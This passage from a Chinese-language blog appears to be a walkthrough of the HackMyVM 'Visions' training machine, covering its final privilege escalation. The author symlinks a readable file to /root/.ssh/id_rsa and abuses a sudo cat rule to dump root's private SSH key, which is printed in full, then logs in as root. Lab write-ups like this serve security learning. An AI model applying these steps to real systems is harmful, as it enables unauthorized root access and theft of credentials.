+<h3 id="切换到isabella"><a href="#切换到isabella" class="headerlink" title="切换到isabella"></a>切换到isabella</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ssh isabella@192.168.161.210 -i id
+Enter passphrase for key &#39;id&#39;:
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+isabella@visions:~$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看这个用户的sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">isabella@visions:~$ sudo -l
+Matching Defaults entries for isabella on visions:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User isabella may run the following commands on visions:
+    (emma) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;man<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以emma的身份执行man，执行之后没啥用，只是切换到了emma用户下</p>
+<pre class="line-numbers language-none"><code class="language-none">isabella@visions:~$ sudo -u emma man man
+$ bash
+emma@visions:&#x2F;home&#x2F;isabella$ id
+uid&#x3D;1000(emma) gid&#x3D;1000(emma) groups&#x3D;1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>只能另寻出路了</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>因为sophia用户可以读取isablella用户下的invisible文件，并且这个文件还是id_rsa文件内容</p>
+<p>先用当前用户将&#x2F;root下的id_rsa文件覆盖invisible文件</p>
+<p>然后切换到sophia用户，执行命令，读取这个文件</p>
+<pre class="line-numbers language-none"><code class="language-none">isabella@visions:~$ rm -rf .&#x2F;.invisible
+isabella@visions:~$ ln -s &#x2F;root&#x2F;.ssh&#x2F;id_rsa .&#x2F;.invisible<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">isabella@visions:&#x2F;home$ su sophia
+Password:
+sophia@visions:&#x2F;home$ sudo -l
+Matching Defaults entries for sophia on visions:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User sophia may run the following commands on visions:
+    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;cat &#x2F;home&#x2F;isabella&#x2F;.invisible
+sophia@visions:&#x2F;home$ sudo &#x2F;usr&#x2F;bin&#x2F;cat &#x2F;home&#x2F;isabella&#x2F;.invisible
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAyezVs6KCQ&#x2F;KFWpEkzDWX3ns&#x2F;X4lUnh6PnNC2IVg3ciVgLcWF&#x2F;&#x2F;wb
+vlQxI+juYu5qTKVEL1FhkNaas+MlQUxabzOv+SDnCck60BLQbZf46sYHQaTrDyu5zhIWWi
+wgPjmic&#x2F;Ykd2qIQyIpyy9Ru4DiVK4RWLZWM28kb6eB99JTt4GSVEhraJ08hKsgaOi+skNg
+S4QG85kG4ghmA1yJpPwzzpIdG4HUic63OXgy+z+pVB5oIEp0YXrCKMN&#x2F;lBngZjZb9&#x2F;+0S1
+ljKzdcq7m1TOQ1Y04YJNMrxvPJ75d8U5s+m6cRxx5F3dX7oTVmErEAxFmJjdWVChzh81Ca
+OnicNjHgrQAAA8hmM8ISZjPCEgAAAAdzc2gtcnNhAAABAQDJ7NWzooJD8oVakSTMNZfeez
+9fiVSeHo+c0LYhWDdyJWAtxYX&#x2F;&#x2F;Bu+VDEj6O5i7mpMpUQvUWGQ1pqz4yVBTFpvM6&#x2F;5IOcJ
+yTrQEtBtl&#x2F;jqxgdBpOsPK7nOEhZaLCA+OaJz9iR3aohDIinLL1G7gOJUrhFYtlYzbyRvp4
+H30lO3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk&#x2F;DPOkh0bgdSJzrc5eDL7P6lU
+HmggSnRhesIow3+UGeBmNlv3&#x2F;7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHk
+Xd1fuhNWYSsQDEWYmN1ZUKHOHzUJo6eJw2MeCtAAAAAwEAAQAAAQEAiCmVXYHLN8h1VkIj
+vzSwiU0wydqQXeOb0hIHjuqu0OEVPyhAGQNHLgwV6vIqtjmxIqgbF5FYKlQclAsq1yKGpR
+AErQkb4sR4TVEyjYR6TM5mnER6YYuJysT1n667u1ogCvRDWOdUpXiHGEV7ZuYdOR78AYdL
+D3n15vjcsmF5JHcftHOxnXraX7JqGXNCoRsMLT&#x2F;yUOl02ClHsjFql1NTI&#x2F;Br0GA4xhM&#x2F;16
+RHoRu1itOlWoyF4XSpSUDHW0RVQ&#x2F;0gm&#x2F;GyAc9QF6EWZXHfMfW07JvkeQLlndVbnItQ9a3v
+ICAAh6zOZWVXpbhCPjjfaWTnwHhhSE3vfxMQQNTJnEghnQAAAIEAjAEzb6Xp6VV1RRaJR3
+&#x2F;Gxo0BRIbPJXdRXpDI3NO4Nvtzv8fX3muV&#x2F;i+dgYPNqa7cwheSJZX9S7RzXsZTZn1Ywbdw
+ahYTVyE9B4Nsen5gekylb59tNwPpCR8sJo6ZIL1GpmkEug+r+0YZyqpZXpG5uhCaSLX1fP
+3UnkgqiKuzpvQAAACBAOOlQPW6pWXvULDsiUkilMXY0SNYLupMHJuqnWTuufyNfRthPQF2
+gfWwXRjfDmzFoM9vVxJKKSd40696qbmTNnu7I4KyvXkF0OQ3IXIelQIiIcDpDbYd17g47J
+IC6dHIQmUib3+whjeTvA5cc21y0EGNHoeNrlknE03dZHaIyfdPAAAAgQDjE3TE17PMEnd&#x2F;
+vzau9bBYZaoRt+eYmvXFrkU&#x2F;UdRwqjS&#x2F;LPWxwmpLOASW9x3bH&#x2F;aiqNGBKeSe2k4C7MWWD5
+tllkIbNEJNDtqQNt2NRvhDUOzAxca1C&#x2F;IySuwoCAvoym5cpZ&#x2F;&#x2F;EQ&#x2F;OvWyZRwk3enReVmmd
+x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ&#x3D;&#x3D;
+-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">sophia@visions:~$ vi id
+sophia@visions:~$ chmod 600 id
+sophia@visions:~$ ssh root@127.0.0.1 -i id
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 19 05:24:08 2021
+root@visions:~# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h3><pre class="line-numbers language-none"><code class="language-none">root@visions:~# cat root.txt
+hmvitspossible<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/3a9f7279.html">https://drume2.github.io/posts/3a9f7279.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/27.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/ab6398fe.html"><img class="prev-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/26webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnyx-Doctor</div></div></a></div><div class="next-post pull-right"><a href="/posts/ce883855.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/26.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-T800</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/10.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="title">HMV-Alzheimer</div></div></a></div><div><a href="/posts/3bb8f4e6.html" title="HMV-Concole"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-27</div><div class="title">HMV-Concole</div></div></a></div><div><a href="/posts/576162f9.html" title="HMV-Devoops"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-20</div><div class="title">HMV-Devoops</div></div></a></div><div><a href="/posts/d1c875b6.html" title="HMV-Driftingblues3"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/20.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-03</div><div class="title">HMV-Driftingblues3</div></div></a></div><div><a href="/posts/6da00c20.html" title="HMV-Flower"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/23.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-02</div><div class="title">HMV-Flower</div></div></a></div><div><a href="/posts/997d3111.html" title="HMV-Helium"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/9.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-25</div><div class="title">HMV-Helium</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HMV-Visons"><span class="toc-number">1.</span> <span class="toc-text">HMV-Visons</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">ssh登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E5%88%B0emma"><span class="toc-number">1.1.3.</span> <span class="toc-text">切换到emma</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E5%88%B0sophia"><span class="toc-number">1.1.4.</span> <span class="toc-text">切换到sophia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#userflag"><span class="toc-number">1.1.5.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E5%88%B0isabella"><span class="toc-number">1.1.6.</span> <span class="toc-text">切换到isabella</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rootflag"><span class="toc-number">1.2.1.</span> <span class="toc-text">rootflag</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/ab6398fe.html" title="Vulnyx-Doctor"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/26webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnyx-Doctor"/></a><div class="content"><a class="title" href="/posts/ab6398fe.html" title="Vulnyx-Doctor">Vulnyx-Doctor</a><time datetime="2025-07-07T15:58:52.000Z" title="发表于 2025-07-07 23:58:52">2025-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3a9f7279.html" title="HMV-Visons"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/27.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Visons"/></a><div class="content"><a class="title" href="/posts/3a9f7279.html" title="HMV-Visons">HMV-Visons</a><time datetime="2025-07-07T14:27:59.000Z" title="发表于 2025-07-07 22:27:59">2025-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ce883855.html" title="HMV-T800"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/26.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-T800"/></a><div class="content"><a class="title" href="/posts/ce883855.html" title="HMV-T800">HMV-T800</a><time datetime="2025-07-04T21:43:31.000Z" title="发表于 2025-07-05 05:43:31">2025-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/80402653.html" title="Vulnyx-Ready"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/25.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnyx-Ready"/></a><div class="content"><a class="title" href="/posts/80402653.html" title="Vulnyx-Ready">Vulnyx-Ready</a><time datetime="2025-07-04T19:05:18.000Z" title="发表于 2025-07-05 03:05:18">2025-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bbf8c8bb.html" title="Vulnyx-Loweb"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/24.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnyx-Loweb"/></a><div class="content"><a class="title" href="/posts/bbf8c8bb.html" title="Vulnyx-Loweb">Vulnyx-Loweb</a><time datetime="2025-07-04T15:44:47.000Z" title="发表于 2025-07-04 23:44:47">2025-07-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
